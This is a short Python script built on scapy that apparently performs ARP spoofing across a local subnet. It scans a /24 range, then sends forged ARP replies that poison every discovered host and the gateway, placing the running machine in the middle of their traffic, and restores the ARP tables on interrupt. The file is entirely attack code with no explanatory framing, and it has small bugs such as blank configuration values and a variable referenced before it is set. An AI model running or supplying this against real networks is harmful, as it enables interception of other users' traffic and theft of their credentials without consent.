from scapy.all import ARP, Ether, srp, send
import time

def get_mac_addr(ip): 

    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=5, verbose=False, iface=interface)[0]
    return answered_list[0][1].hwsrc

def spoof_arp(interface, gateway_ip, target_ip):

    target_mac = get_mac_addr(target_ip)
    gateway_mac = get_mac_addr(gateway_ip)
    
    arp_reply_to_target = ARP(op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip)
    arp_reply_to_gateway = ARP(op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip)
    
    print(f"Sending spoofed ARP replies: {gateway_ip} <-> {target_ip}.")
    send(arp_reply_to_target, iface=interface, verbose=False)
    send(arp_reply_to_gateway, iface=interface, verbose=False)

def restore(destination_ip, source_ip, interface):

    destination_mac = get_mac_addr(destination_ip)
    source_mac = get_mac_addr(source_ip)
    
    arp_reply_to_target = ARP(op=2, psrc=source_ip, hwsrc=source_mac, hwdst=destination_mac, pdst=destination_ip)
    arp_reply_to_gateway = ARP(op=2, psrc=destination_ip, hwsrc=destination_mac, hwdst=source_mac, pdst=source_ip)
    
    print(f"Restoring ARP table for: {destination_ip} <-> {source_ip}")
    for _ in range(4):
        send(arp_reply_to_target, iface=interface, verbose=False)
        send(arp_reply_to_gateway, iface=interface, verbose=False)
        time.sleep(1)
    print("Cleanup complete.")

def scan_ip_range(network, interface, gateway_ip):

    active_ips = []
    print(f"Scanning for active IPs in {network}...")
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    answered, _ = srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)
    
    for sent, received in answered:
        target_ip = received.psrc
        if target_ip != gateway_ip: 
            active_ips.append(target_ip)
            spoof_arp(interface, gateway_ip, target_ip)
    
    return active_ips

# Configuration
network = "/24"  
interface = ""  
gateway_ip = ""  

try:
    active_ips = scan_ip_range(network, interface, gateway_ip)
except KeyboardInterrupt:
    print("\nARP spoofing interrupted by user. Restoring ARP tables...")
    for ip in active_ips:
        restore(ip, gateway_ip, interface)
        restore(gateway_ip, ip, interface)
    print("Clean up")
